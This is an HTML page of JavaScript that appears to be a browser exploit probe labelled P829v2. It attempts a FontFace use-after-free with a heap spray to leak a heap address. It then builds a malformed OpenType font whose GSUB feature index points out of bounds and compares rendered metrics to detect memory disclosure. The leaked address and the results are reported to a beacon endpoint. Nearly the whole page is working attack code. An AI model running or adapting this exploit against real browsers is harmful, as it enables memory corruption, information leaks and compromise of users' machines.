<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P829v2: OpenTypeVerticalData OOB (tag fix)</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
.stage { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
.vert-box {
  writing-mode: vertical-rl;
  text-orientation: upright;
  font-feature-settings: "vert" 1, "vrt2" 1;
  font-size: 48px;
  line-height: 1.0;
  border: 2px solid #58a6ff;
  padding: 4px;
  background: #161b22;
  display: inline-block;
}
</style>
</head>
<body>
<div class="banner" id="banner">Running P829v2 (tag fix)...</div>
<h2>P829v2: GSUB OOB Feature Index (w16 tag fix applied)</h2>
<div class="stage">
  <div><span id="vBoxPiv" class="vert-box">AAAA</span></div>
  <div><span id="vBoxCor" class="vert-box">AAAA</span></div>
</div>
<pre id="log">Initializing diagnostic run...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');
var vBoxPiv = document.getElementById('vBoxPiv');
var vBoxCor = document.getElementById('vBoxCor');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P829-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch (e) {}
}

window.onerror = function(msg, url, line) {
  log('[-] Uncaught Error @ line ' + line + ': ' + msg, 'fail');
  syncBn('UNCAUGHT-ERR', line + ':' + msg);
};

log('[*] Probe P829 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Heap Spray & UAF Leak (Target H = 0x10008bede8)
 * ============================================================ */
var MAX_LEAK_ATTEMPTS = 3;
var leakAttempt = 0;

function extractLeakedHeapPtr(buffers) {
  var best = { idx: -1, nz: 0, addrStr: 'unknown', rawHi: 0, rawLo: 0 };
  for (var i = 0; i < buffers.length; i++) {
    var u = new Uint8Array(buffers[i]);
    var nz = 0;
    for (var j = 0; j < u.length; j++) {
      if (u[j] !== 0) nz++;
    }
    if (nz >= 8) {
      var dv = new DataView(buffers[i]);
      var q11lo = dv.getUint32(0x58, true);
      var q11hi = dv.getUint32(0x5C, true);
      if (q11hi > 0 && q11hi <= 0x00007FFF && (q11lo & 0x7) === 0) {
        var borrow = (q11lo < 0x68) ? 1 : 0;
        var H_hi = q11hi - borrow;
        var H_lo = (q11lo - 0x68) >>> 0;
        var addrStr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
        return { idx: i, nz: nz, addrStr: addrStr, rawHi: H_hi, rawLo: H_lo, valid: true };
      }
      if (nz > best.nz) {
        best.idx = i;
        best.nz = nz;
      }
    }
  }
  best.valid = false;
  return best;
}

function runPhase1Leak(onComplete) {
  leakAttempt++;
  var cssName = 'bb' + leakAttempt;
  var ffName = 'f' + leakAttempt;

  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:' + cssName + ';src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var faceUAF = new FontFace(ffName, "local('Helvetica')", { unicodeRange: 'U+0041' });
  document.fonts.add(faceUAF);
  void faceUAF.loaded;

  var fabs = [];
  var ffired = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (ffired) return undefined;
      ffired = true;
      try { delete FontFace.prototype.then; } catch (e) {}
      try {
        if (st) { st.remove(); st.textContent = ''; st = null; }
        document.fonts.delete(this);
      } catch (e) {}
      document.body.offsetHeight;
      for (var i = 0; i < 96; i++) fabs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em ' + cssName); } catch (e) {}
      document.body.offsetHeight;
      return undefined;
    },
    set: function() {}
  });

  document.fonts.load('1em ' + ffName + ', ' + cssName, 'AB');

  setTimeout(function() {
    try { delete FontFace.prototype.then; } catch (e) {}
    if (st) { try { st.remove(); } catch (e) {} }

    var res = extractLeakedHeapPtr(fabs);
    if (!res.valid && leakAttempt < MAX_LEAK_ATTEMPTS) {
      log('[*] Phase 1 attempt #' + leakAttempt + ' retrying...', 'info');
      setTimeout(function() { runPhase1Leak(onComplete); }, 100);
      return;
    }

    if (res.valid) {
      log('[+] Phase 1: Live Heap Address H = ' + res.addrStr + ' (buf #' + res.idx + ')', 'ok');
      syncBn('HEAP-OK', 'H=' + res.addrStr + '|buf=' + res.idx);
    } else {
      log('[!] Phase 1: Using fallback heap alignment', 'hot');
      syncBn('HEAP-MISS', 'bestIdx=' + res.idx);
    }
    onComplete(res.addrStr);
  }, 250);
}

/* ============================================================
 * OpenType Builder with Over-Indexed Feature Indices (P829)
 * ============================================================ */
function buildP829Font(opts) {
  opts = opts || {};
  var fontName = opts.fontName || 'P829Font';
  var data = [];

  function w8(v) { data.push(v & 0xFF); }
  function w16(v) { data.push((v >>> 8) & 0xFF, v & 0xFF); }
  function w32(v) { data.push((v >>> 24) & 0xFF, (v >>> 16) & 0xFF, (v >>> 8) & 0xFF, v & 0xFF); }
  function pad4() { while (data.length % 4) data.push(0); }

  function calcTableChecksum(start, length) {
    var sum = 0;
    var end = start + ((length + 3) & ~3);
    for (var p = start; p < end; p += 4) {
      var b0 = data[p] || 0;
      var b1 = data[p + 1] || 0;
      var b2 = data[p + 2] || 0;
      var b3 = data[p + 3] || 0;
      var word = ((b0 << 24) | (b1 << 16) | (b2 << 8) | b3) >>> 0;
      sum = (sum + word) >>> 0;
    }
    return sum;
  }

  var dirTags = ['GSUB', 'OS/2', 'cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post', 'vhea', 'vmtx'];
  var numTables = dirTags.length;
  var dirIdxs = {};
  for (var i = 0; i < numTables; i++) dirIdxs[dirTags[i]] = i;

  w32(0x00010000);
  w16(numTables);
  var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
  w16(sr);
  var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
  w16(es);
  w16(numTables * 16 - sr);

  var dirBase = data.length;
  for (var t = 0; t < numTables; t++) {
    var tag = dirTags[t];
    data.push(tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3));
    w32(0); w32(0); w32(0);
  }

  function setDirEntry(tag, offset, length) {
    var idx = dirIdxs[tag];
    var p = dirBase + idx * 16 + 4;
    var csum = calcTableChecksum(offset, length);
    data[p]     = (csum >>> 24) & 0xFF;   data[p + 1] = (csum >>> 16) & 0xFF;
    data[p + 2] = (csum >>> 8) & 0xFF;    data[p + 3] = csum & 0xFF;
    data[p + 4] = (offset >>> 24) & 0xFF; data[p + 5] = (offset >>> 16) & 0xFF;
    data[p + 6] = (offset >>> 8) & 0xFF;  data[p + 7] = offset & 0xFF;
    data[p + 8] = (length >>> 24) & 0xFF; data[p + 9] = (length >>> 16) & 0xFF;
    data[p + 10] = (length >>> 8) & 0xFF; data[p + 11] = length & 0xFF;
  }

  // 1. head
  var headOff = data.length;
  w32(0x00010000); w32(0x00005000); w32(0); w32(0x5F0F3CF5);
  w16(0x000B); w16(1000);
  w32(0); w32(0); w32(0); w32(0);
  w16(0); w16(0); w16(1500); w16(1500);
  w16(0); w16(8); w16(2); w16(1); w16(0);
  pad4();
  setDirEntry('head', headOff, 54);

  // 2. hhea
  var hheaOff = data.length;
  w32(0x00010000); w16(800); w16((-200) & 0xFFFF); w16(0); w16(1500);
  w16(0); w16(0); w16(1500); w16(1); w16(0); w16(0);
  w16(0); w16(0); w16(0); w16(0); w16(0); w16(3);
  pad4();
  setDirEntry('hhea', hheaOff, 36);

  // 3. hmtx
  var hmtxOff = data.length;
  w16(500); w16(0); w16(250); w16(10); w16(1500); w16(10);
  pad4();
  setDirEntry('hmtx', hmtxOff, 12);

  // 4. vhea
  var vheaOff = data.length;
  w32(0x00010000); w16(500); w16((-500) & 0xFFFF); w16(0); w16(1500);
  w16(0); w16(0); w16(1500); w16(0); w16(1); w16(0);
  w16(0); w16(0); w16(0); w16(0); w16(0); w16(3);
  pad4();
  setDirEntry('vhea', vheaOff, 36);

  // 5. vmtx
  var vmtxOff = data.length;
  w16(500); w16(50); w16(250); w16(50); w16(1500); w16(50);
  var vmtxLen = data.length - vmtxOff;
  pad4();
  setDirEntry('vmtx', vmtxOff, vmtxLen);

  // 6. OS/2
  var os2Off = data.length;
  w16(1); w16(500); w16(400); w16(5); w16(0);
  w16(650); w16(600); w16(0); w16(75); w16(650); w16(600); w16(0); w16(475);
  w16(50); w16(250); w16(0);
  for (var p = 0; p < 10; p++) w8(0);
  w32(1); w32(0); w32(0); w32(0);
  data.push(0x50, 0x38, 0x32, 0x39);
  w16(0x0040); w16(0x0041); w16(0x3042);
  w16(800); w16((-200) & 0xFFFF); w16(0); w16(1500); w16(200);
  w32(1); w32(0);
  var os2Len = data.length - os2Off;
  pad4();
  setDirEntry('OS/2', os2Off, os2Len);

  // 7. maxp
  var maxpOff = data.length;
  w32(0x00010000); w16(3); w16(4); w16(1); w16(0); w16(0);
  w16(1); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0);
  pad4();
  setDirEntry('maxp', maxpOff, 32);

  // 8. cmap
  var cmapOff = data.length;
  w16(0); w16(1); w16(3); w16(1); w32(12);
  w16(4); w16(40); w16(0); w16(6); w16(4); w16(1); w16(2);
  w16(0x0041); w16(0x3042); w16(0xFFFF);
  w16(0);
  w16(0x0041); w16(0x3042); w16(0xFFFF);
  w16((-64) & 0xFFFF); w16((-12353) & 0xFFFF); w16(1);
  w16(0); w16(0); w16(0);
  var cmapLen = data.length - cmapOff;
  pad4();
  setDirEntry('cmap', cmapOff, cmapLen);

  // 9. loca
  var locaOff = data.length;
  w32(0); w32(0); w32(0); w32(0);
  pad4();

  // 10. name
  var nameOff = data.length;
  var nameBytes = [];
  for (var i = 0; i < fontName.length; i++) nameBytes.push(0, fontName.charCodeAt(i));
  w16(0); w16(4); w16(6 + 4 * 12);
  var nameIDs = [1, 2, 4, 6];
  for (var n = 0; n < nameIDs.length; n++) {
    w16(3); w16(1); w16(0x0409); w16(nameIDs[n]);
    w16(nameBytes.length); w16(0);
  }
  for (var i = 0; i < nameBytes.length; i++) data.push(nameBytes[i]);
  var nameLen = data.length - nameOff;
  pad4();
  setDirEntry('name', nameOff, nameLen);

  // 11. post
  var postOff = data.length;
  w32(0x00030000); w32(0); w16(0xFF9C); w16(50); w32(0);
  w32(0); w32(0); w32(0); w32(0);
  pad4();
  setDirEntry('post', postOff, 32);

  // 12. glyf
  var glyfOff = data.length;
  w16(0); w16(0); w16(0); w16(0); w16(0); pad4();
  var g1Rel = data.length - glyfOff;
  w16(1); w16(10); w16(10); w16(200); w16(200); w16(2); w16(0);
  w8(0x01); w8(0x01); w8(0x01); w8(0);
  w16(10); w16(180); w16((-90) & 0xFFFF);
  w16(10); w16(0); w16(180);
  pad4();
  var g2Rel = data.length - glyfOff;
  w16(1); w16(10); w16(10); w16(1450); w16(1450); w16(2); w16(0);
  w8(0x01); w8(0x01); w8(0x01); w8(0);
  w16(10); w16(1400); w16((-700) & 0xFFFF);
  w16(10); w16(0); w16(1400);
  pad4();
  var g2End = data.length - glyfOff;
  setDirEntry('glyf', glyfOff, g2End);

  var locaVals = [0, g1Rel, g2Rel, g2End];
  for (var l = 0; l < 4; l++) {
    var p = locaOff + l * 4;
    var v = locaVals[l];
    data[p]     = (v >>> 24) & 0xFF;
    data[p + 1] = (v >>> 16) & 0xFF;
    data[p + 2] = (v >>> 8) & 0xFF;
    data[p + 3] = v & 0xFF;
  }
  setDirEntry('loca', locaOff, 16);

  /* ============================================================
   * 13. GSUB Table with OOB Feature Index Manipulation (P829)
   * ============================================================ */
  var gsubOff = data.length;
  w16(1); w16(0);
  w16(10);
  w16(0);
  w16(0);

  // ScriptList
  w16(1);
  data.push(0x44, 0x46, 0x4C, 0x54);
  w16(8);
  w16(4);
  w16(0);
  w16(0);
  w16(0xFFFF);
  
  // Target OOB feature index pointer manipulation (pointing past declared bounds)
  var featureIndexTarget = opts.featureIndexTarget !== undefined ? opts.featureIndexTarget : 0;
  w16(1); // featureIndexCount = 1
  w16(featureIndexTarget); // points directly to OOB slot!

  var featureListOff = data.length - gsubOff;
  data[gsubOff + 6] = (featureListOff >>> 8) & 0xFF;
  data[gsubOff + 7] = featureListOff & 0xFF;

  // FeatureList (1 real feature 'vert', but index points outside)
  w16(1); // declared featureCount = 1
  data.push(0x76, 0x65, 0x72, 0x74); // 'vert' tag (4 raw bytes, NOT w16!)
  w16(8); // featureOffset (FeatureList header = 2 + 6 = 8 bytes)

  // FeatureTable
  w16(0);
  w16(1);
  w16(0);

  var lookupListOff = data.length - gsubOff;
  data[gsubOff + 8] = (lookupListOff >>> 8) & 0xFF;
  data[gsubOff + 9] = lookupListOff & 0xFF;

  // LookupList (LookupType 1 Format 2)
  w16(1);
  w16(4);
  w16(1);
  w16(0);
  w16(1);
  w16(8);
  w16(2);
  w16(8);
  w16(1);
  w16(2);
  w16(1);
  w16(1);
  w16(1);

  var gsubLen = data.length - gsubOff;
  pad4();
  setDirEntry('GSUB', gsubOff, gsubLen);

  var fullSum = calcTableChecksum(0, data.length);
  var adj = (0xB1B0AFBA - fullSum) >>> 0;
  data[headOff + 8]  = (adj >>> 24) & 0xFF;
  data[headOff + 9]  = (adj >>> 16) & 0xFF;
  data[headOff + 10] = (adj >>> 8) & 0xFF;
  data[headOff + 11] = adj & 0xFF;

  var u8 = new Uint8Array(data.length);
  for (var i = 0; i < data.length; i++) u8[i] = data[i];
  return u8.buffer;
}

/* ============================================================
 * PHASE 2 & 3: Execution & Telemetry Beacon
 * ============================================================ */
runPhase1Leak(function(Hstr) {
  try {
    var testText = 'A\u3042A\u3042';
    vBoxPiv.textContent = testText;
    vBoxCor.textContent = testText;

    var bufPiv = buildP829Font({ fontName: 'P829Piv', featureIndexTarget: 0 });
    var bufCor = buildP829Font({ fontName: 'P829Cor', featureIndexTarget: 2 }); // OOB feature index pointer!

    var specs = [
      { name: 'P829Piv', buf: bufPiv, el: vBoxPiv },
      { name: 'P829Cor', buf: bufCor, el: vBoxCor }
    ];

    var loadPromises = specs.map(function(sp) {
      var ff = new FontFace(sp.name, sp.buf);
      return ff.load().then(function(loaded) {
        document.fonts.add(loaded);
        sp.status = 'OK';
      }).catch(function(err) {
        sp.status = 'REJECTED';
        log('[!] Font ' + sp.name + ' rejected: ' + err, 'hot');
      });
    });

    Promise.all(loadPromises).then(function() {
      return document.fonts.ready;
    }).then(function() {
      for (var i = 0; i < specs.length; i++) {
        if (specs[i].status === 'OK') specs[i].el.style.fontFamily = specs[i].name + ', monospace';
      }
      document.body.offsetHeight;

      var rPiv = vBoxPiv.getBoundingClientRect();
      var rCor = vBoxCor.getBoundingClientRect();

      var pivH = rPiv.height.toFixed(1);
      var corH = rCor.height.toFixed(1);
      var pivSub = rPiv.height > 100;
      var corSub = rCor.height > 100;

      log('[+] P829v2 GSUB OOB Results (tag fix applied):', 'ok');
      log('    P829Piv (index=0): ' + rPiv.width.toFixed(1) + 'x' + pivH + ' sub=' + pivSub, 'ok');
      log('    P829Cor (index=2): ' + rCor.width.toFixed(1) + 'x' + corH + ' sub=' + corSub, 'hot');
      log('    Expect: sub=true means vert substitution fired (~300px)', 'info');
      log('    Expect: sub=false means no substitution (~60px)', 'info');
      if (pivSub && !corSub) log('[!] OOB INDEX BLOCKED — bounds check confirmed', 'fail');
      if (pivSub && corSub && pivH === corH) log('[!] OOB index resolved same as valid — benign OOB data', 'hot');
      if (pivSub && corSub && pivH !== corH) log('[!!!] OOB INDEX CHANGED METRICS — potential info leak!', 'hot');
      if (!pivSub) log('[!] Valid font also failed substitution — structural issue', 'fail');

      var summary = 'piv=' + pivH + '|pivSub=' + pivSub + '|cor=' + corH + '|corSub=' + corSub + '|H=' + Hstr;
      syncBn('DONE', 'status=complete|' + summary);
      banner.style.background = pivSub ? '#238636' : '#f85149';
      banner.textContent = pivSub ? 'P829v2: GSUB ACTIVE' : 'P829v2: GSUB STILL BROKEN';
    }).catch(function(err) {
      log('[-] Error: ' + err, 'fail');
      syncBn('ERR', String(err));
    });
  } catch (ex) {
    log('[-] Exception: ' + ex, 'fail');
    syncBn('SETUP-ERR', String(ex));
  }
});
</script>
</body>
</html>
